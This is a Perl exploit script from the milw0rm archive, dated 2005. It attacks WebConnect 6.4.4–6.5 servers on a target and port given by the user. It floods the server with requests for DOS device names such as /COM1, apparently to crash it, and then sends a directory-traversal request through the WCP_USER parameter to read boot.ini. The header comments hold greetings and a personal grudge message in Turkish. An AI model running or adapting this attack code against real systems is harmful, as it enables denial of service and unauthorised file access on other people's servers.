#WebConnect version 6.4.4 - 6.5 Proof of Concept
#Coded bY ++Karak0rsan++
#karakorsankara@hotmail.com
#Usage:perl webconnect.pl [target] [port] (Default port: 2080)
#Greetz:hurby,phalaposher,r3d_b4r0n,L4M3R,zeronc,Atak,sloan,emre,
#fox and all my friends
#Konak Anatolian High School - Prep/C Class
#Sen kendini biliyosun,attigin kaziklari unutmuycam artýk okulda
#yuzume de bakamiyosun.Masum suratina,gozlerine ALDANMISIM!
#Herseyi sen baslattin sen bitirdin unutma;SENIN BENI BITIRDIGIN
#YERDE SENDE BENIM ICIN BITERSIN!!!

$host=$ARGV[0];
$port=$ARGV[1];

if(!$ARGV[1]){
print "WebConnect 6.4.4 - 6.5 Proof of Concept\n";
print "Coded by ++Karak0rsan++\n";
print "Usage:perl $0 [target] [port]\n";
}


use IO::Socket;
$socket = new IO::Socket::INET( PeerAddr => $host,
PeerPort => $port,
Proto => 'tcp',
Type => SOCK_STREAM, );
close($socket);
if($socket){
print "[+]Attacking...!\n";
print "[+]Allah Allah edalariyla saldiriyoz cunku biz muslumaniz:)\n";
}

use IO::Socket;
for($i= 0; $i < 30; $i++)
{
$socket1 = new IO::Socket::INET( PeerAddr => $host,
PeerPort => $port,
Proto => 'tcp',
Type => SOCK_STREAM, ) or die "Didnt Connect,Enter target address!\n";
print $socket1 "GET /COM1 HTTP/1.0\r\n";
print $socket1 "GET /COM2 HTTP/1.0\r\n";
print $socket1 "GET /COM1.jsp HTTP/1.0\r\n";
print $socket1 "GET /COM1.html HTTP/1.0\r\n";
print $socket1 "GET /COM1.smurf HTTP/1.0\r\n";
close($socket1);
}
$socket2 = new IO::Socket::INET( PeerAddr => $host,
PeerPort => $port,
Proto => 'tcp',
Type => SOCK_STREAM, );
print $socket2 "GET 
/jretest.html?lang=&parms=default&WCP_USER=..//..//..//..//..//boot.ini&action= 
HTTP/1.0\r\n";
close($socket2);
print "Attack finished ;)\n";
exit();

# milw0rm.com [2005-02-24]
